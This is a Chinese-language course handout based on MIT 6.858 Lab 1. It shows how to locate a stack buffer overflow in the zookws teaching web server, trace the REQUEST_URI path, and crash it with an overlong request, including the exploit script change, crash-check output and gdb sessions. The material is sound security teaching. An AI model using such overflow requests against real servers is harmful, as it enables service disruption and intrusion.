#缓冲区溢出课程2：实验1

###哈尔滨工业大学 网络与信息安全 张宇 2016

###参考课程: [MIT 6.858 Computer Systems Security](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm) by Prof. Nickolai Zeldovich

实验资料见[MIT 6.858 Computer Systems Security](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm)中Lab 1。

本实验中，我们通过缓冲区溢出漏洞来攻击一个web服务器`zookws`。该服务器上运行一个Python的web应用`zoobar`，用户之间转移一种称为“zoobars”的货币。

### 准备实验环境

实验环境为Ubuntu，在VMware Player (VMware Fusion)虚拟机中运行。系统中有两个账号，`root`，口令6858，用来安装软件；`httpd`，口令6858，用来运行Web服务器和实验程序。

1. 在VMware里用`httpd`账号登录后，运行`ifconfig`查看IP地址
1. 用终端软件通过SSH登录系统`ssh httpd@IP地址`
1. 运行`scp lab1.zip httpd@IP地址`将实验程序拷贝到`/home/httpd`
2. 安装`unzip`程序，解压缩文件，并移动到`/home/httpd/lab`
3. `make`编译程序
4. 启动服务器`./clean-env.sh ./zookld zook-exstack.conf`
5. 用浏览器访问zook服务`http://虚拟机IP地址:8080/`

- `clean-env.sh`脚本令程序每次运行时栈和内存布局都相同
- `zookld.c`: 启动`zook.conf`中所配置服务，如`zookd`和`zookfs`
- `zookd.c`: 将HTTP请求路由到相应服务，如`zookfs`
- `zookfs.c`: 提供静态文件或执行动态代码服务
- `http.c`: HTTP实现
- `index.html`: Web服务器首页
- `/zoobar`目录：zoobar服务实现

```
                    +-------+   
                    |zookld |<--- "zook-*.conf" 
                    +---+---+                 
                        |--------------+
                        |              |
+------+    HTTP    +---V---+      +---V---+     
|client| <--------> |zookd  |<---->|zookfs |<--- "/zoobar"
+------+            +---^---+      +---^---+     
                        |              | (2) http_request_headers()
(1) http_request_line() |   +------+   | (3) http_serve()
                        +---| http |---+
                            +------+
```


服务器端采用CGI (Common Gateway Interface)技术，将客户端请求URL映射到脚本或者普通HTML文件。CGI脚本可以由任意程序语言实现，脚本只需将HTTP头部和HTML文档输出到标准输出。本例CGI由`/zoobar`目录中的python脚本实现。目前，我们不需要关心具体zoobar服务内容。

`zookd`和`zookfs`执行程序分别有两个版本：

- `*-exstack`版本有可执行的栈，将攻击代码注入到栈中缓冲区
- `*-nxstack`版本的栈不可执行，需要用其他技术来运行攻击代码

查看一下被启动的程序：

``` sh
$ ps -fp $(pgrep zook)
UID        PID  PPID  C STIME TTY      STAT   TIME CMD
httpd     4448  2493  0 15:44 pts/3    S+     0:00 /home/httpd/lab/zookld zook-exstack.conf
httpd     4453  4448  0 15:44 pts/3    S+     0:00 zookd-exstack 5
httpd     4454  4448  0 15:44 pts/3    S+     0:00 zookfs-exstack 6
```

### 练习1：寻找缓冲区溢出漏洞

需要研究服务器代码找到 **至少5处** 缓冲区溢出漏洞。

下面演示一个例子（作业中不能使用本示例）：

首先，我们看看缓冲区溢出存在的要素：数组（字符串），串处理/读取函数（写操作）。

数组：`char * s`, `char s[128]`, `int a[128]`, `void * p`。

函数： `strcpy()`, `strcat()`, `sprintf()`, `vsprintf()`, `gets()`, `getc()`, `read()`, `scanf()`, `getenv()`。

除了调用函数外，还可能通过`for/while {}`循环的方式来访问缓冲区。

接着，试着搜索一个‘危险’函数`strcpy()`。

``` c
$ grep -n 'strcpy' *.c
http.c:344:    strcpy(dst, dirname);
```
在`http.c`中找到了一处潜在漏洞，来具体看一下代码。

``` c
void dir_join(char *dst, const char *dirname, const char *filename) {
    strcpy(dst, dirname);
    if (dst[strlen(dst) - 1] != '/')
        strcat(dst, "/");
    strcat(dst, filename);
}
```

`dir_join()`函数将`dirname`和`filename`先后拷贝到`dst`中。显然，这里并没有检查每一个字符串长度。若`dirname`长度比`dst`缓冲长，则`strcpy()`调用存在缓冲区溢出风险。

进一步检查使用`dir_join()`时是否存在导致缓冲区溢出的可能：

``` c
void http_serve_directory(int fd, const char *pn) {
    /* for directories, use index.html or similar in that directory */
    static const char * const indices[] = {"index.html", "index.php", "index.cgi", NULL};
    char name[1024];
    struct stat st;
    int i;

    for (i = 0; indices[i]; i++) {
        dir_join(name, pn, indices[i]);
        if (stat(name, &st) == 0 && S_ISREG(st.st_mode)) {
            dir_join(name, getenv("SCRIPT_NAME"), indices[i]);
            break;
        }
    }

    if (indices[i] == NULL) {
        http_err(fd, 403, "No index file in %s", pn);
        return;
    }

    http_serve(fd, name);
}
```
在`dir_join(name, pn, indices[i]);`调用中，`char name[]`长度为1024。`char * pn`长度待定，继续查看`http_serve_directory()`调用情况。

``` c
void http_serve(int fd, const char *name)
{
    void (*handler)(int, const char *) = http_serve_none;
    char pn[1024];
    struct stat st;

    getcwd(pn, sizeof(pn));
    setenv("DOCUMENT_ROOT", pn, 1);

    strcat(pn, name);
    split_path(pn);

    if (!stat(pn, &st))
    {
        /* executable bits -- run as CGI script */
        if (valid_cgi_script(&st))
            handler = http_serve_executable;
        else if (S_ISDIR(st.st_mode))
            handler = http_serve_directory;
        else
            handler = http_serve_file;
    }

    handler(fd, pn);
}
```
`handler = http_serve_executable`，`handler()`中的`pn`长度1024，内容来自`getcwd()`加上`strcat(pn, name)`。若`name`过长，则`pn`长度也将过长。通过进一步分析`http_serve()`调用过程，发现`name`内容来自于环境变量`REQUEST_URI`。

``` c
zookfs.c:47:   http_serve(sockfd, getenv("REQUEST_URI"));
```
该环境变量在`http.c`中`http_request_line()`函数中被设置。

``` c
http.c:107:    envp += sprintf(envp, "REQUEST_URI=%s", reqpath) + 1;
```

我们把这一漏洞命名为“REQUEST_URI”漏洞，回顾分析过程如下：

``` c
http.c:344:    strcpy(dst, dirname) // dst size = ?
 \                                  //  |
  dir_join(name, pn, indices[i]);   // name size = 1024
   \                                //  |
    handler(fd, pn);                // pn size = 1024
     \
      zookfs.c:47:    http_serve(sockfd, getenv("REQUEST_URI"));
      http.c:107:    envp += sprintf(envp, "REQUEST_URI=%s", reqpath) + 1;
```

**问：** 如何利用这一漏洞？远程用户是否能够直接触发这一漏洞？


### 练习2：触发缓冲区溢出漏洞

本练习中每个人挑选两个缓冲区溢出漏洞。首先，该漏洞必须能改写栈中的一个返回地址；其次，改写一些数据结构来用于夺取程序的控制流。撰写触发该漏洞的程序，并验证改程序可以导致web服务器崩溃（通过`dmesg | tail`, 使用`gdb`, 或直接观察）。

漏洞利用程序模板为`exploit-template.py`，该程序向服务器发送特殊请求。改写模板来利用漏洞，将两个漏洞利用程序分别命名为`exploit-2a.py`和`exploit-2b.py`。最后，用`make check-crash`命令来验证是否能够令服务器崩溃。

首先启动服务：`./clean-env.sh ./zookld zook-exstack.conf`。
下面是是未改写的`exploit-template.py`执行结果。

``` html
$ ./exploit-template.py 127.0.0.1 8080
HTTP request:
GET / HTTP/1.0       <-- 客户端请求：方法，URL，HTTP版本号

Connecting to 127.0.0.1:8080...
Connected, sending request...
Request sent, waiting for reply...
Received reply.
HTTP response:
HTTP/1.0 200 OK      <-- HTTP版本号，状态代码
<html>               <-- 文档
<head>
  <meta http-equiv="refresh" content="0; URL=zoobar/index.cgi/" />
</head>
<body>
  <a href="zoobar/index.cgi/">Click here</a>
</body>
</html>
```
我们发现了可由我们控制的用户输入，客户端请求位于下面代码中： 

``` python
## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)

    req =   "GET / HTTP/1.0\r\n" + \
            "\r\n"
    return req
```

目前，我们手上有了两个攻击服务器的武器：(1) “REQUEST_URI”缓冲区溢出漏洞，(2)构造请求输入`req`的脚本。下一步就是要分析`http.c`中处理该请求的代码，将`req`中内容和`REQUEST_URI`对应起来。

通过分析代码可以发现，HTTP请求中的路径，例如`/foo.html`，被赋予了`REQUEST_URI`变量，因此可以通过构造较长的HTTP请求路径来令缓冲区溢出。
下面的代码有删节。

``` c
const char *http_request_line(int fd, char *reqpath, char *env, size_t *env_len)
{
    static char buf[8192];      /* static variables are not on the stack */
    char *sp1, *sp2, *qp, *envp = env;
    //  ... ... 
    if (http_read_line(fd, buf, sizeof(buf)) < 0)
        return "Socket IO error";

    /* Parse request like "GET /foo.html HTTP/1.0" */
    sp1 = strchr(buf, ' ');
    if (!sp1)
        return "Cannot parse HTTP request (1)";
    *sp1 = '\0';
    sp1++;
    if (*sp1 != '/')
        return "Bad request path";
    sp2 = strchr(sp1, ' ');
    if (!sp2)
        return "Cannot parse HTTP request (2)";
    *sp2 = '\0';
    sp2++;
    //  ... ...
    /* decode URL escape sequences in the requested path into reqpath */
    url_decode(reqpath, sp1);
    envp += sprintf(envp, "REQUEST_URI=%s", reqpath) + 1;
    //  ... ...
}
```

之前发现缓冲区有1024字节，我们就令请求路径超过1024字节。

``` python
 req =   "GET /" + 'A' * 1024 + " HTTP/1.0\r\n" + \
            "\r\n"
```
将攻击脚本复制两份，命名为`exploit-2a.py`和`exploit-2b.py`，并用`make check-crash`来验证是否导致程序崩溃。

``` sh
$ make check-crash
./check-bin.sh
./check-part2.sh zook-exstack.conf ./exploit-2a.py
./check-part2.sh: line 8:  4398 Terminated              strace -f -e none -o "$STRACELOG" ./clean-env.sh ./zookld $1 &> /dev/null
4417  --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
4417  +++ killed by SIGSEGV +++
PASS ./exploit-2a.py
./check-part2.sh zook-exstack.conf ./exploit-2b.py
./check-part2.sh: line 8:  4423 Terminated              strace -f -e none -o "$STRACELOG" ./clean-env.sh ./zookld $1 &> /dev/null
4442  --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
4442  +++ killed by SIGSEGV +++
PASS ./exploit-2b.py
```

上面结果表明缓冲区漏洞导致程序因为SIGSEV信号而崩溃，`si_addr=0x41414141`，并通过(PASS)了检查。
下面我们看看具体发生了什么。

需要使用`gdb -p 进程号`来调试程序。进程号可以通过两种方法获得：通过观察`zookld`在终端输出子进程ID；或者使用`pgrep`，例如`gdb -p $(pgrep zookd-exstack)`。

使用`gdb`过程中，当父进程`zookld`被`^C`杀死时，被`gdb`调试的进程并不会被终止。这将导致无法重启web服务器。因此，在重启`zookld`之前，应先退出`gdb`。

当生成子进程时，`gdb`缺省情况下仍然调试父进程，而不会跟踪子进程。由于`zookfs`为每个服务请求生成一个子进程，为了自动跟踪子进程，使用`set follow-fork-mode child`命令。该命令已经被加入`/home/httpd/lab/.gdbinit`中，`gdb`启动时会自动执行。

在终端1中，重启服务：`$ ./clean-env.sh ./zookld zook-exstack.conf`。

在终端2中，启动`gdb`：`$ gdb -p $(pgrep zookd-exstack)`。
在设置断点后，在终端3中，运行漏洞触发程序`./exploit-2a.py localhost 8080`。

``` sh
(gdb) b http_request_line
Breakpoint 1 at 0x8049150: file http.c, line 67.
[运行漏洞触发程序]
(gdb) c
Continuing.

Breakpoint 1, http_request_line (fd=5, reqpath=0xbfffee08 "", env=0x804e520 <env> "", env_len=0x8050520 <env_len>) at http.c:67
warning: Source file is more recent than executable.
67          char *sp1, *sp2, *qp, *envp = env; 
(gdb) n
[执行n多次直到REQUEST_URI被处理完]
(gdb) n
109         envp += sprintf(envp, "SERVER_NAME=zoobar.org") + 1;
(gdb) x/10 buf        [打印buf，请求中各字段已经被分割]
0x8050540 <buf.4435>:   "GET"
0x8050544 <buf.4435+4>: "/", 'A' <repeats 199 times>...
0x805060c <buf.4435+204>:       'A' <repeats 200 times>...
0x80506d4 <buf.4435+404>:       'A' <repeats 200 times>...
0x805079c <buf.4435+604>:       'A' <repeats 200 times>...
0x8050864 <buf.4435+804>:       'A' <repeats 200 times>...
0x805092c <buf.4435+1004>:      'A' <repeats 25 times>
0x8050946 <buf.4435+1030>:      "HTTP/1.0"
0x805094f <buf.4435+1039>:      ""
0x8050950 <buf.4435+1040>:      ""
(gdb) x/10 reqpath    [打印reqpath，为"/", A * 1024]
0xbfffee08:     "/", 'A' <repeats 199 times>...
0xbfffeed0:     'A' <repeats 200 times>...
0xbfffef98:     'A' <repeats 200 times>...
0xbffff060:     'A' <repeats 200 times>...
0xbffff128:     'A' <repeats 200 times>...
0xbffff1f0:     'A' <repeats 25 times>
0xbffff20a:     "\005\b|\365\377\277"
0xbffff211:     ""
0xbffff212:     ""
0xbffff213:     ""
 x/10s buf
 
 p reqpath
 x/10 env
```



##课程3：Shellcode与代码注入

### 一个Shellcode例子








